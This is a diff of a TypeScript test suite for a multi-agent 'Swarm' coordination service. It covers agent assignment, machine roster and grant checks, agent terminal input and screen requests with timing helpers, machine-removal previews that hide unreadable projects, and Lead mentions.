-  const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
+  const assignmentId = (await storeAssignment(db, tab, group, worker)).id
   await store.stopped(host, tab, assignmentId, 'completed')
-  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' }, host, lead)
+  await run(tab, { type: 'agent.release', agentId: worker, decision: 'stop' })
   await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [] })
   const state = (await store.read(owner, tab)).state
   expect(state.projects!.find(p => p.id === 'lead')!.visibility).toBe('private')
@@ -3047,9 +2689,9 @@ it.each(['finished', 'expired'] as const)('lets another Swarm reuse after the na
   const first = await fixture(), other = await fixture(), native = randomUUID()
   const group = (await run(first.tab, { type: 'conversation.create', title: 'Task', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
   const worker = (await run(first.tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: native, name: 'Worker', configuration: config, lead: false })).result.agentId as string
-  const assignmentId = (await run(first.tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
+  const assignmentId = (await storeAssignment(db, first.tab, group, worker)).id
   await store.stopped(host, first.tab, assignmentId, 'completed')
-  await run(first.tab, { type: 'agent.release', agentId: worker, decision: 'stop' }, host, first.lead)
+  await run(first.tab, { type: 'agent.release', agentId: worker, decision: 'stop' })
   const leased = await run(first.tab, { type: 'agent.stopLease', agentId: worker, releaseId: (await store.read(owner, first.tab)).state.agents.find(a => a.id === worker)!.releaseId! } as Command, host, worker)
   const reuse = { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: native, name: 'Reused', configuration: config, lead: false } as Command
   if (outcome === 'expired') await run(first.tab, { type: 'agent.remove', agentId: worker })
@@ -3069,9 +2711,11 @@ describe('the owner\'s Lead machine joins its Swarm', () => {
     const machineId = `owner-mac-${randomUUID()}`
     await db.machine.create({ data: { machineId, userId: owner.sub, apiKey: `fixture-${machineId}`, managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
     const tab = (await store.create(owner, randomUUID(), 'Own machine')).id
-    const lead = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId, harnessId: randomUUID(), name: 'Lead', configuration: config, lead: true })).result.agentId as string
+    await run(tab, { type: 'agent.add', conversationId: 'lead', machineId, harnessId: randomUUID(), name: 'Lead', configuration: config, lead: true })
     expect((await rosterRows(store, owner, machineId)).map(r => r.joinSwarm)).toEqual([true])
-    const request = { conversationId: 'lead', machineId, engine: 'codex', name: 'Builder', cwd: '/repo', worktree: true,
+    // Started in a task: the project chat holds only its coordinator among agents (#2207). Its chat still hears of them.
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Builds', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: group, machineId, engine: 'codex', name: 'Builder', cwd: '/repo', worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
     const start = async () => (await run(tab, { type: 'agent.start', request })).result.startId as string
     const [abandoned, inFlight, dispatched] = [await start(), await start(), await start()]
@@ -3092,14 +2736,31 @@ describe('the owner\'s Lead machine joins its Swarm', () => {
     expect(joined.starts!.find(s => s.id === dispatched)!.error).toBeNull()
     const notice = (await store.messages(owner, tab, 'lead', {})).messages.at(-1)!
     expect(notice.text).toBe('Builder never started and will not start now.')
-    // The notice is written in the owner's name, but the system wrote it: a Lead cannot quote it as the owner asking.
-    await expect(run(tab, { type: 'rule.set', rule: { kind: 'preferIdle' }, text: 'Idle first.', askedIn: { conversationId: 'lead', messageId: notice.id } },
-      owner, lead)).rejects.toMatchObject({ code: 'ASKED_BY_REQUIRED' })
     const added = joined.machines!.find(m => m.machineId === machineId)!
     expect(added).toMatchObject({ contributorId: owner.sub, maxAgents: 3, scope: 'swarm', cwd: '/swarm' })
     expect((await rosterRows(store, owner, machineId)).map(r => r.joinSwarm)).toEqual([false, false])
     await run(tab, { ...join, maxAgents: 8, cwd: '/elsewhere' })
     expect((await store.read(owner, tab)).state.machines!.find(m => m.machineId === machineId)).toEqual(added)
+  })
+
+  // Swarm v4: a plain agent leads no conversation, and a Personal Swarm may hold nothing else. Its host joined the machine only for a
+  // Lead, so such a Swarm never got its machine, and the machine's rows never came (Personal Swarm, 2026-11-10).
+  it('adds the machine a plain agent of the owner runs on, in a Personal Swarm with nothing else', async () => {
+    const machineId = `owner-plain-${randomUUID()}`
+    await db.machine.create({ data: { machineId, userId: owner.sub, apiKey: `fixture-${machineId}`, managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
+    const tab = (await store.create(owner, PERSONAL_SWARM_OPERATION, 'Personal')).id
+    const chat = String((await run(tab, { type: 'agent.new', kind: 'regular', machineId, engine: 'codex', name: 'Ada', local: true })).result.conversationId)
+    await run(tab, { type: 'agent.add', conversationId: chat, machineId, harnessId: randomUUID(), name: 'Ada', configuration: config, lead: false })
+    expect((await rosterRows(store, owner, machineId)).filter(r => r.tabId === tab).map(r => r.joinSwarm)).toEqual([true])
+    await run(tab, { type: 'machine.contribute', machineId, name: 'Ken Mac', cwd: '/swarm', scope: 'swarm', engines: ['codex'], maxAgents: 3, ifMissing: true })
+    expect((await store.read(owner, tab)).state.machines!.map(m => m.machineId)).toEqual([machineId])
+    expect((await rosterRows(store, owner, machineId)).filter(r => r.tabId === tab).map(r => r.joinSwarm)).toEqual([false])
+    // Its person takes the machine out of the Swarm, then runs a new agent on it: the host is not asked to add it back (an older CLI
+    // does whatever this says).
+    await run(tab, { type: 'machine.remove', machineId })
+    const again = String((await run(tab, { type: 'agent.new', kind: 'regular', machineId, engine: 'codex', name: 'Bo', local: true })).result.conversationId)
+    await run(tab, { type: 'agent.add', conversationId: again, machineId, harnessId: randomUUID(), name: 'Bo', configuration: config, lead: false })
+    expect((await rosterRows(store, owner, machineId)).filter(r => r.tabId === tab && r.agent?.name === 'Bo').map(r => r.joinSwarm)).toEqual([false])
   })
 
   it('never adds another account\'s machine', async () => {
@@ -3187,16 +2848,16 @@ describe('grant checks of the host roster', () => {
   }
   const agentIds = (rows: Array<{ tabId: string; agent?: { id: string } }>, tab: string) => rows.filter(r => r.tabId === tab && r.agent).map(r => r.agent!.id).sort()
 
-  it('reads the machine, its share, and each contributor and their Workspace membership once per host read, not once per agent', async () => {
+  it('reads the machine, its share and each contributor once per host read, not once per agent', async () => {
     const { machineId, tab, add } = await sharedMachine()
     const agents = [await add(tab, 'Lead', owner, true)]
     for (let i = 0; i < 4; i++) agents.push(await add(tab, `Owner worker ${i}`, owner))
     for (let i = 0; i < 3; i++) agents.push(await add(tab, `Peer worker ${i}`, peer))
     const { store: counting, count } = counted()
     expect(agentIds(await rosterRows(counting, host, machineId), tab)).toEqual(agents.sort())
-    // Eight agents of two contributors on one machine: the read's own machine check, one share, two people, two memberships.
-    expect({ machines: count('Machine.findFirst'), shares: count('MachineShare.findUnique'), contributors: count('User.findUnique'),
-      memberships: count('SwarmWorkspaceMember.findUnique') }).toEqual({ machines: 1, shares: 1, contributors: 2, memberships: 2 })
+    // Eight agents of two contributors on one machine: the read's own machine check, one share and two people.
+    expect({ machines: count('Machine.findFirst'), shares: count('MachineShare.findUnique'), contributors: count('User.findUnique') })
+      .toEqual({ machines: 1, shares: 1, contributors: 2 })
   })
 
   it('checks agents of one contributor checked at once with one read of each lookup', async () => {
@@ -3206,8 +2867,8 @@ describe('grant checks of the host roster', () => {
     const { store: counting, count } = counted()
     const reads = new GrantReads()
     await Promise.all(agents.map(id => counting.agentGrant(counting.db, state, state.agents.find(a => a.id === id)!, reads)))
-    expect({ machines: count('Machine.findFirst'), shares: count('MachineShare.findUnique'), contributors: count('User.findUnique'),
-      memberships: count('SwarmWorkspaceMember.findUnique') }).toEqual({ machines: 1, shares: 1, contributors: 1, memberships: 1 })
+    expect({ machines: count('Machine.findFirst'), shares: count('MachineShare.findUnique'), contributors: count('User.findUnique') })
+      .toEqual({ machines: 1, shares: 1, contributors: 1 })
   })
 
   it('keeps nothing between two host reads of one store: a share revoked between them drops the rows on the next', async () => {
@@ -3232,26 +2893,13 @@ describe('grant checks of the host roster', () => {
     expect(agentIds(await rosterRows(counted().store, host, machineId), tab)).toEqual(mine.sort())
   })
 
-  it('still drops a contributor\'s rows only in the Swarms of the Workspace they left', async () => {
-    const { machineId, tab, add } = await sharedMachine()
-    const mine = [await add(tab, 'Lead', owner, true), await add(tab, 'Owner worker', owner)]
-    await add(tab, 'Peer worker 1', peer)
-    await add(tab, 'Peer worker 2', peer)
-    // The peer's own Swarm, in the peer's own Workspace, on the same machine.
-    const theirs = (await store.create(peer, randomUUID(), 'Peer Swarm')).id
-    const peers = [await add(theirs, 'Peer Lead', peer, true), await add(theirs, 'Peer helper', peer)]
-    const workspaceId = (await db.superTab.findUniqueOrThrow({ where: { id: tab } })).workspaceId!
-    expect((await db.superTab.findUniqueOrThrow({ where: { id: theirs } })).workspaceId).not.toBe(workspaceId)
-    await db.swarmWorkspaceMember.update({ where: { id: `${workspaceId}:${peer.sub}` }, data: { removedAt: new Date() } })
-    const rows = await rosterRows(counted().store, host, machineId)
-    expect(agentIds(rows, tab)).toEqual(mine.sort())
-    expect(agentIds(rows, theirs)).toEqual(peers.sort())
-  })
 })
 
 describe('the Lead reads and types in an agent terminal', () => {
   async function terminalFixture() {
     const { tab, lead } = await fixture()
+    // Its machine's person types in the worker's terminal: only an agent's own login does (Swarm v4).
+    await joinHost(tab)
     const group = (await run(tab, { type: 'conversation.create', title: 'Terminal', brief: 'Answer the prompt', checks: [] })).result.conversationId as string
     const harnessId = randomUUID()
     const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId,
@@ -3278,14 +2926,14 @@ describe('the Lead reads and types in an agent terminal', () => {
     expect(JSON.stringify([history, receipts, await store.read(owner, tab)])).not.toContain('fixture-secret')
   })
 
-  it('logs typed input in the agent group and hands the host the text and keys', async () => {
+  it('hands the host the text and keys, and writes no row', async () => {
     const { tab, worker, group, harnessId, claim } = await terminalFixture()
-    const requestId = (await run(tab, { type: 'agent.input', agentId: worker, text: '/model', keys: ['Enter'] })).result.requestId as string
+    // Its machine's person types in it: only an agent's own login does (Swarm v4).
+    const requestId = (await run(tab, { type: 'agent.input', agentId: worker, text: '/model', keys: ['Enter'] }, host)).result.requestId as string
     expect(await claim()).toEqual([{ tabId: tab, agentId: worker, harnessId, request: { id: requestId, kind: 'input', text: '/model', keys: ['Enter'] } }])
-    const rows = (await store.messages(owner, tab, group, {})).messages.filter(m => (m.source as { kind?: string } | null)?.kind === 'terminal-input')
-    expect(rows.map(m => [m.text, m.recipientIds])).toEqual([[expect.stringMatching(/^owner typed `\/model` \+ Enter in .+'s terminal$/), []]])
+    expect((await store.messages(owner, tab, group, {})).messages.filter(m => (m.source as { kind?: string } | null)?.kind === 'terminal-input')).toEqual([])
     await run(tab, { type: 'agent.inputResult', requestId, ok: true }, host, worker)
-    expect(await store.terminalResult(owner, tab, requestId)).toEqual({ requestId, ok: true })
+    expect(await store.terminalResult(host, tab, requestId)).toEqual({ requestId, ok: true })
   })
 
   it('fails with a plain reason when the host never picks up or never answers, and never types late', async () => {
@@ -3293,18 +2941,18 @@ describe('the Lead reads and types in an agent terminal', () => {
     const unseen = (await run(tab, { type: 'agent.screen', agentId: worker }, host, lead)).result.requestId as string
     expect(await claim(later(11_000))).toEqual([])
     expect(await store.terminalResult(host, tab, unseen, lead)).toEqual({ requestId: unseen, ok: false, error: expect.stringContaining('did not pick up') })
-    const typed = (await run(tab, { type: 'agent.input', agentId: worker, keys: ['Enter'] }, host, lead)).result.requestId as string
+    const typed = (await run(tab, { type: 'agent.input', agentId: worker, keys: ['Enter'] }, host)).result.requestId as string
     expect(await claim()).toHaveLength(1)
-    expect(await later(31_000).terminalResult(host, tab, typed, lead)).toEqual({ requestId: typed, ok: false, error: expect.stringContaining('did not answer') })
+    expect(await later(31_000).terminalResult(host, tab, typed)).toEqual({ requestId: typed, ok: false, error: expect.stringContaining('did not answer') })
     await expect(run(tab, { type: 'agent.inputResult', requestId: typed, ok: true }, host, worker)).rejects.toThrow('unavailable')
   })
 
   it('never hands the host a request for a terminal that was replaced', async () => {
     const { tab, lead, worker, claim } = await terminalFixture()
-    const requestId = (await run(tab, { type: 'agent.input', agentId: worker, keys: ['Enter'] }, host, lead)).result.requestId as string
+    const requestId = (await run(tab, { type: 'agent.input', agentId: worker, keys: ['Enter'] }, host)).result.requestId as string
     await db.superTabTerminalRequest.update({ where: { id: requestId }, data: { harnessId: 'replaced-terminal' } })
     expect(await claim()).toEqual([])
-    expect(await store.terminalResult(host, tab, requestId, lead)).toEqual({ requestId, ok: false, error: expect.stringContaining('changed') })
+    expect(await store.terminalResult(host, tab, requestId)).toEqual({ requestId, ok: false, error: expect.stringContaining('changed') })
   })
 
   // Neither demotion has a command (the Lead guard keeps a project's Lead), so the state is edited the way a future one would.
@@ -3352,6 +3000,35 @@ describe('the Lead reads and types in an agent terminal', () => {
     return { at, loads: () => load.mock.calls.length, listeners: (requestId: string) => notices.listenerCount(requestId) }
   }
 
+  /** The wait's re-checks (store.ts terminalResult, every TERMINAL_RECHECK_MS), held while a test sets up its answer, then run
+   *  for their whole period: an answer that comes while none has fired was woken by its notice, however slow the runner (task
+   *  #4308: a 100 ms wall-clock bound failed at 154 ms on a busy CI runner). `asleep` settles once the wait sleeps on one. */
+  function heldRechecks() {
+    const realSet = globalThis.setTimeout, realClear = globalThis.clearTimeout
+    const held = new Map<object, { run: () => void; timer?: ReturnType<typeof realSet> }>()
+    let released = false, fired = 0, sleeping = () => {}
+    const asleep = new Promise<void>(resolve => { sleeping = resolve })
+    const start = (handle: object, entry: { run: () => void; timer?: ReturnType<typeof realSet> }) => {
+      entry.timer = realSet(() => { held.delete(handle); fired++; entry.run() }, TERMINAL_RECHECK_MS)
+    }
+    const set = vi.spyOn(globalThis, 'setTimeout').mockImplementation(((run: (...args: unknown[]) => void, ms?: number, ...args: unknown[]) => {
+      if (ms !== TERMINAL_RECHECK_MS) return realSet(run, ms, ...args)
+      const handle = {}, entry = { run: () => run(...args) }
+      held.set(handle, entry)
+      if (released) start(handle, entry)
+      sleeping()
+      return handle
+    }) as typeof setTimeout)
+    const clear = vi.spyOn(globalThis, 'clearTimeout').mockImplementation(((handle?: object) => {
+      const entry = handle && held.get(handle)
+      if (!entry) return realClear(handle as ReturnType<typeof realSet>)
+      held.delete(handle)
+      if (entry.timer) realClear(entry.timer)
+    }) as typeof clearTimeout)
+    onTestFinished(() => { set.mockRestore(); clear.mockRestore() })
+    return { asleep, release: () => { released = true; for (const [handle, entry] of held) start(handle, entry) }, fired: () => fired }
+  }
+
   it('waits for an answer without loading the Swarm again and again', async () => {
     const { tab, lead, worker, claim } = await terminalFixture()
     const requestId = (await run(tab, { type: 'agent.screen', agentId: worker }, host, lead)).result.requestId as string
@@ -3367,13 +3044,14 @@ describe('the Lead reads and types in an agent terminal', () => {
     const requestId = (await run(tab, { type: 'agent.screen', agentId: worker }, host, lead)).result.requestId as string
     expect(await claim()).toHaveLength(1)
     const { at, loads } = watched()
-    const waiting = at.terminalResult(host, tab, requestId, lead, 20_000).then(answer => ({ answer, at: Date.now() }))
-    await new Promise(resolve => setTimeout(resolve, 300))
+    const rechecks = heldRechecks()
+    const waiting = at.terminalResult(host, tab, requestId, lead, 20_000)
+    await rechecks.asleep
     await at.execute(host, tab, { operationId: randomUUID(), command: { type: 'agent.screenResult', requestId, ok: true, text: 'screen' } }, worker)
-    const answeredAt = Date.now()
-    const { answer, at: returnedAt } = await waiting
-    expect(answer).toEqual({ requestId, ok: true, text: 'screen' })
-    expect(returnedAt - answeredAt).toBeLessThan(100)
+    rechecks.release()
+    expect(await waiting).toEqual({ requestId, ok: true, text: 'screen' })
+    // Woken by the commit's notice: no re-check ran, so the answer did not wait for one.
+    expect(rechecks.fired()).toBe(0)
     expect(loads()).toBeLessThanOrEqual(4)
   })
 
@@ -3385,10 +3063,10 @@ describe('the Lead reads and types in an agent terminal', () => {
     const started = Date.now()
     expect(await late.at.terminalResult(host, tab, unseen, lead, 20_000)).toEqual({ requestId: unseen, ok: false, error: expect.stringContaining('did not pick up') })
     expect(Date.now() - started).toBeLessThan(2_000)
-    const replaced = (await run(tab, { type: 'agent.input', agentId: worker, keys: ['Enter'] }, host, lead)).result.requestId as string
+    const replaced = (await run(tab, { type: 'agent.input', agentId: worker, keys: ['Enter'] }, host)).result.requestId as string
     await db.superTabTerminalRequest.update({ where: { id: replaced }, data: { harnessId: 'replaced-terminal' } })
     const { at } = watched()
-    const waiting = at.terminalResult(host, tab, replaced, lead, 20_000)
+    const waiting = at.terminalResult(host, tab, replaced, undefined, 20_000)
     await new Promise(resolve => setTimeout(resolve, 300))
     const refusedAt = Date.now()
     expect(await claim(at)).toEqual([])
@@ -3415,13 +3093,45 @@ describe('the Lead reads and types in an agent terminal', () => {
     const requestId = (await run(tab, { type: 'agent.screen', agentId: worker }, host, lead)).result.requestId as string
     expect(await claim()).toHaveLength(1)
     const { at, loads } = watched({ heard: false })
+    const rechecks = heldRechecks()
     const waiting = at.terminalResult(host, tab, requestId, lead, 20_000)
-    await new Promise(resolve => setTimeout(resolve, 300))
+    await rechecks.asleep
     await run(tab, { type: 'agent.screenResult', requestId, ok: true, text: 'screen' }, host, worker)
-    const answeredAt = Date.now()
+    rechecks.release()
     expect(await waiting).toEqual({ requestId, ok: true, text: 'screen' })
-    expect(Date.now() - answeredAt).toBeLessThan(6_000)
+    // The one re-check after the answer found it.
+    expect(rechecks.fired()).toBe(1)
     expect(loads()).toBeLessThanOrEqual(3)
+  })
+
+  // Task #2800: while the server pushes, a host picks up terminal requests only when told (cli superTabs/terminal.ts), so a push
+  // lost on the way is told again by the sender's own wait, at each re-check of a request still waiting for its host: inside
+  // the 10 s pickup window, and with no read the wait does not already make.
+  it('tells the host again of a request still waiting for pickup at each re-check, and never of one picked up', async () => {
+    const { tab, lead, worker, claim } = await terminalFixture()
+    const told: unknown[] = []
+    const at = new SuperTabStore(db, Date.now, null, { terminalWaiting: waiting => { told.push(waiting) } })
+    const unseen = (await run(tab, { type: 'agent.screen', agentId: worker }, host, lead)).result.requestId as string
+    expect(await at.terminalResult(host, tab, unseen, lead, 1_500)).toEqual({ requestId: unseen, pending: true })
+    expect(told).toEqual([{ machineId: 'test-host', tabId: tab, agentId: worker }])
+    expect(await claim()).toHaveLength(1)
+    told.length = 0
+    expect(await at.terminalResult(host, tab, unseen, lead, 1_500)).toEqual({ requestId: unseen, pending: true })
+    expect(told).toEqual([])
+  })
+
+  // Task #2800's measure: the database operations one empty answer costs, which each read a timer no longer makes saves.
+  // Printed for the pull request.
+  it('measures the database operations of an empty worker list read and an empty terminal pickup', async () => {
+    const { tab, worker } = await terminalFixture()
+    const ops = async (run: () => Promise<unknown>) => (await profiled(db, run)).filter(e => !e.ns.endsWith('.system.profile')).length
+    const full = await ops(() => store.deliveries(host, tab, worker))
+    const quiet = await ops(() => store.deliveries(host, tab, worker))
+    // 30 s on, as the host's timer read came: the full poll again, the read cache warm.
+    const warm = await ops(() => later(31_000).deliveries(host, tab, worker))
+    const pickup = await ops(() => store.hostTerminal(host, 'test-host'))
+    process.stderr.write(`[#2800 measure] DB operations per empty answer: worker list full ${full} (cold cache) / ${warm} (warm), quiet ${quiet}, terminal pickup ${pickup}\n`)
+    expect(Math.min(full, warm, quiet, pickup)).toBeGreaterThan(0)
   })
 
   it('expires an unread answer after two minutes, without waiting for another request', async () => {
@@ -3460,7 +3170,8 @@ describe('Product Managers chat, removed (Dee, 2026-10-31)', () => {
     stored.conversations.push({ id: leads, kind: 'leads', title: 'Leads', leadId: null, agentIds: [lead, docsLead], archived: false, brief: '',
       checks: [], assignment: null, lastMessageSequence: 1 })
     await saveState(tab, stored)
-    const said = String((await run(tab, { type: 'message.send', conversationId: 'lead', text: 'Status?', replyTo: null, recipientIds: [] })).result.messageId)
+    // A worker's message to the PM in the project's chat: only agents post there (agentsOnly.test.ts).
+    const said = String((await (await crew(tab, lead)).say('Status?')).result.messageId)
     const template = await db.superTabMessage.findUniqueOrThrow({ where: { id: said } })
     const old = await db.superTabMessage.create({ data: { ...template, id: `m-${randomUUID()}`, conversationId: leads, sequence: 1, text: 'Who goes first?',
       thread: null, author: template.author as never, source: undefined } })
@@ -3489,34 +3200,22 @@ describe('Product Managers chat, removed (Dee, 2026-10-31)', () => {
     expect((await store.messages(owner, tab, 'lead', {})).messages.map(m => m.text)).toContain('Status?')
   })
 
-  it('shows Leads the other projects\' work and tells the other Lead of an overlap in its own project chat alone', async () => {
+  it('shows Leads the other projects\' work', async () => {
     const { tab, lead } = await fixture()
     const docs = String((await run(tab, { type: 'project.create', name: 'Docs', visibility: 'public', brief: '' })).result.projectId)
     const docsChat = (await store.read(owner, tab)).state.projects!.find(p => p.id === docs)!.leadConversationId
-    const docsLead = (await run(tab, { type: 'agent.add', conversationId: docsChat, machineId: 'test-host', harnessId: randomUUID(), name: 'Docs Lead',
-      configuration: config, lead: true })).result.agentId as string
+    await run(tab, { type: 'agent.add', conversationId: docsChat, machineId: 'test-host', harnessId: randomUUID(), name: 'Docs Lead',
+      configuration: config, lead: true })
     const task = (owns: string[]) => ({ goal: 'Polish', changes: 'Roster', constraints: 'None', owns })
     const checks = [{ description: 'Done', independent: false }]
     const roster = String((await run(tab, { type: 'conversation.create', projectId: docs, title: 'Roster', task: task(['desktop/lib/super_tabs']), checks })).result.conversationId)
     const worker = (await run(tab, { type: 'agent.add', conversationId: roster, machineId: 'test-host', harnessId: randomUUID(), name: 'Docs Worker',
       configuration: config, lead: false })).result.agentId as string
-    await run(tab, { type: 'work.assign', conversationId: roster, agentId: worker })
+    await storeAssignment(db, tab, roster, worker)
 
     expect((await store.read(host, tab, lead)).state.otherProjectsWork).toEqual([expect.objectContaining({ conversationId: roster, projectName: 'Docs',
       title: 'Roster', owns: ['desktop/lib/super_tabs'], status: 'working' })])
     expect((await store.read(host, tab, worker)).state).not.toHaveProperty('otherProjectsWork')
-
-    const filter = String((await run(tab, { type: 'conversation.create', title: 'Agents filter', task: task(['desktop/lib/super_tabs/roster.dart']), checks },
-      host, lead)).result.conversationId)
-    await run(tab, { type: 'work.define', conversationId: filter, task: task(['desktop/lib/super_tabs']), checks }, host, lead)
-    const alerts = await db.superTabMessage.findMany({ where: { tabId: tab, source: { equals: { kind: 'overlap', conversationIds: [filter, roster] } } } })
-    // The Lead that made the overlap knows it; the other project's Lead hears it in its own project chat, written as itself.
-    expect(alerts).toEqual([expect.objectContaining({ conversationId: docsChat, recipientIds: [docsLead],
-      author: expect.objectContaining({ id: docsLead }), text: expect.stringContaining('"Agents filter" (Pilot') })])
-    expect((await store.deliveries(host, tab, docsLead)).filter(d => d.messageId === alerts[0]!.id)).toHaveLength(1)
-    // The two Leads' to settle (Ken, 2026-10-29): the Lead it reaches reads it; people in the project chat do not.
-    expect((await store.messages(host, tab, docsChat, {}, docsLead)).messages.map(m => m.id)).toContain(alerts[0]!.id)
-    expect((await store.messages(owner, tab, docsChat, {})).messages.map(m => m.id)).not.toContain(alerts[0]!.id)
   })
 })
 
@@ -3537,12 +3236,12 @@ describe('a Swarm written by a later release', () => {
     await saveState(tab, stored as unknown as SuperTabState)
 
     expect((await store.read(owner, tab)).state.conversations.map(c => c.id)).toEqual([chat.id])
-    await run(tab, { type: 'message.send', conversationId: chat.id as string, text: 'Still writable', replyTo: null, recipientIds: [] })
-    expect((await store.messages(owner, tab, chat.id as string, {})).messages.map(m => m.text)).toEqual(['Still writable'])
+    // A person's write there (a person posts in no project's channel, agentsOnly.test.ts).
+    await run(tab, { type: 'conversation.rename', conversationId: chat.id as string, title: 'Still writable' })
     await expect(store.messages(owner, tab, 'later', {})).rejects.toMatchObject({ code: 'NOT_FOUND' })
     const written = await storedState(tab) as unknown as Stored
     expect(written.laterField).toEqual({ kept: true })
-    expect(written.conversations.find(c => c.id === chat.id)!.laterField).toBe('kept')
+    expect(written.conversations.find(c => c.id === chat.id)).toMatchObject({ title: 'Still writable', laterField: 'kept' })
     // A later release, which knows the kind, puts it back from here.
     expect(written.parkedConversations).toEqual([later])
   })
@@ -3585,7 +3284,12 @@ describe('machine removal', () => {
     const preview = (user: AuthUser) => app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/machines/test-host/removal`, headers: { authorization: `Bearer ${user.sub}` } })
     const shown = await preview(host)
     expect(shown.statusCode, shown.body).toBe(200)
-    expect(shown.json().data).toEqual({ blockedBy: null, agents: [{ id: worker, name: 'Worker', projectName: 'Remove' }], soleSourceProjects: [] })
+    expect(shown.json().data).toEqual({ blockedBy: null, agents: [{ id: worker, name: 'Worker', projectName: 'Remove' }],
+      soleSourceProjects: [] })
+    const current = await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/machines/test-host/removal/v2`, headers: { authorization: `Bearer ${host.sub}` } })
+    expect(current.statusCode, current.body).toBe(200)
+    expect(current.json().data).toEqual({ previewVersion: 2, blockedBy: null, agents: [{ id: worker, name: 'Worker', projectName: 'Remove' }], hiddenAgentCount: 0,
+      soleSourceProjects: [], hiddenSoleSourceProjectCount: 0 })
     expect((await preview(owner)).statusCode).toBe(403)
     await expect(run(tab, { type: 'machine.remove', machineId: 'test-host' })).rejects.toMatchObject({ code: 'FORBIDDEN' })
 
@@ -3601,6 +3305,51 @@ describe('machine removal', () => {
     expect(ack.statusCode, ack.body).toBe(200)
     expect(await cleanups(tab)).toEqual([])
     expect((await store.read(owner, tab)).state.machines).toEqual([])
+  })
+
+  it('the removal route counts an unreadable project and still refuses to remove its PM', async () => {
+    const tab = await contributed()
+    const projectId = String((await run(tab, { type: 'project.create', name: 'Secret Project', visibility: 'private', brief: '' })).result.projectId)
+    const taskConversationId = String((await run(tab, { type: 'conversation.create', projectId, title: 'Secret Task', brief: '', checks: [] })).result.conversationId)
+    const state = await storedState(tab)
+    const project = state.projects!.find(item => item.id === projectId)!
+    const leadChat = state.conversations.find(item => item.id === project.leadConversationId)!
+    const taskChat = state.conversations.find(item => item.id === taskConversationId)!
+    const hostGeneration = state.people.find(person => person.id === host.sub)!.generation
+    const pmId = randomUUID(), workerId = randomUUID()
+    const makeAgent = (id: string, name: string): Agent => ({ id, projectId, machineId: 'test-host', harnessId: randomUUID(),
+      machineOwnerId: host.sub, contributorId: host.sub, membershipGeneration: hostGeneration, hostGrant: null, name,
+      configuration: config, configurationVersion: randomUUID() })
+    const pm = makeAgent(pmId, 'Secret PM'), worker = makeAgent(workerId, 'Secret Builder')
+    leadChat.leadId = pmId
+    leadChat.agentIds.push(pmId)
+    taskChat.agentIds.push(workerId)
+    project.repository = { machineId: 'test-host', cwd: '/secret/repository', repositoryUrl: null }
+    state.agents.push(pm, worker)
+    // Its work from before Swarm v3, which no longer assigns a project to an agent whose person cannot read it (task #4120).
+    taskChat.assignment = { id: randomUUID(), agentId: workerId, status: 'working', configuration: config,
+      execution: { machineId: 'test-host', harnessId: worker.harnessId, machineOwnerId: host.sub }, result: null } as never
+    await saveState(tab, state)
+
+    const legacy = await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/machines/test-host/removal`, headers: { authorization: `Bearer ${host.sub}` } })
+    expect(legacy.statusCode, legacy.body).toBe(426)
+    expect(legacy.json().error).toEqual({ code: 'UPDATE_REQUIRED', message: 'Update Harness to remove this machine.' })
+    for (const unreadable of [projectId, pmId, workerId, 'Secret Project', 'Secret PM', 'Secret Builder', 'Secret Task', '/secret/repository']) {
+      expect(legacy.body).not.toContain(unreadable)
+    }
+
+    const shown = await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/machines/test-host/removal/v2`, headers: { authorization: `Bearer ${host.sub}` } })
+    expect(shown.statusCode, shown.body).toBe(200)
+    expect(shown.json().data).toEqual({
+      previewVersion: 2, blockedBy: { reason: "A Product Manager of a project you can't see runs on this machine." }, agents: [], hiddenAgentCount: 2,
+      soleSourceProjects: [], hiddenSoleSourceProjectCount: 1,
+    })
+    for (const unreadable of [projectId, pmId, workerId, 'Secret Project', 'Secret PM', 'Secret Builder', 'Secret Task', '/secret/repository']) {
+      expect(JSON.stringify(shown.json().data)).not.toContain(unreadable)
+    }
+    await expect(run(tab, { type: 'machine.remove', machineId: 'test-host' }, host)).rejects.toMatchObject({
+      code: 'LEAD_PROTECTED', message: "A Product Manager of a project you can't see prevents this action.",
+    })
   })
 
   it('drops a machine that went silent while cleaning, and a reconnecting host gets that cleanup once before its ack', async () => {
@@ -3672,352 +3421,44 @@ describe('machine removal', () => {
 })
 
 describe('Lead mentions', () => {
-  const DAY = 24 * 60 * 60_000
-  async function tagged(role: 'collaborator' | 'viewer' = 'collaborator') {
+  async function tagged() {
     const { tab, lead } = await fixture()
-    await invite(tab, role)
+    await invite(tab)
     const group = (await run(tab, { type: 'conversation.create', title: 'Copy review', brief: '', checks: [] })).result.conversationId as string
     await run(tab, { type: 'conversation.agent', conversationId: group, agentId: lead, present: true, lead: true })
-    const text = `Please confirm the welcome copy. ${'x'.repeat(300)}`
+    const text = 'Please confirm the welcome copy.'
     const messageId = (await run(tab, { type: 'message.send', conversationId: group, text, replyTo: null, recipientIds: [], mentions: [peer.sub] },
       host, lead)).result.messageId as string
-    return { tab, lead, group, text, messageId }
+    return { tab, lead, group, messageId }
   }
-  const list = async (tab: string, user: AuthUser, state: 'waiting' | 'earlier') => {
-    const response = await app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/mentions?state=${state}`, headers: { authorization: `Bearer ${user.sub}` } })
-    expect(response.statusCode, response.body).toBe(200)
-    return response.json().data.mentions as Array<Record<string, unknown>>
-  }
